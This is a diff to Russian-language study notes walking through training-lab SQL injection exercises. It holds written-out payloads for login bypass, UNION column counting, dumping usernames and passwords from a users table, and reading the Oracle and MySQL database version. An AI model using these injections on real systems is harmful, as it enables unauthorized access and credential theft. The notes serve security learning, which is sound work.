@@ -6,6 +6,7 @@
   + Открываем форму для ввода логина и пароля.
   + В поле Login вводим "administrator'-- ", а в поле Password любые символы.
   + WIN.
+  
 + Lab: SQL injection UNION attack, determining the number of columns returned by the query
   + Переходим в один из разделов, например Gifts.
   + В строке urla дописываем "'+UNION+SELECT+NULL--". Ошибка.
@@ -32,4 +33,16 @@
   + В строке urla дописываем "'+UNION+SELECT+username,+password+FROM+users--". Ошибка.
   + В строке urla дописываем "'+UNION+SELECT+NULL,+username||'~'||password+FROM+users--". Ошибки нет.
   + Видим строку administrator~mhzg7sj4crpgoavh769q, вводим в форму логина логин administrator и пароль mhzg7sj4crpgoavh769q.
+  + WIN.
+  
++ Lab: SQL injection attack, querying the database type and version on Oracle  
+  + В строке urla дописываем "'+UNION+SELECT+NULL+FROM+DUAL--". Ошибка.
+  + В строке urla дописываем "'+UNION+SELECT+NULL,+NULL+FROM+DUAL--". Ошибки нет.
+  + В строке urla дописываем "'+UNION+SELECT+BANNER,+NULL+FROM+v$version--". Получаем Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production.
+  + WIN.
++ Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+  + Переходим в один из разделов, например Gifts.
+  + В строке urla дописываем "'+UNION+SELECT+NULL-- /". Ошибка.
+  + В строке urla дописываем "'+UNION+SELECT+NULL,+NULL-- /". Ошибки нет.
+  + В строке urla дописываем "'+UNION+SELECT+@@version,+NULL-- /". Получаем 8.0.15.
   + WIN.
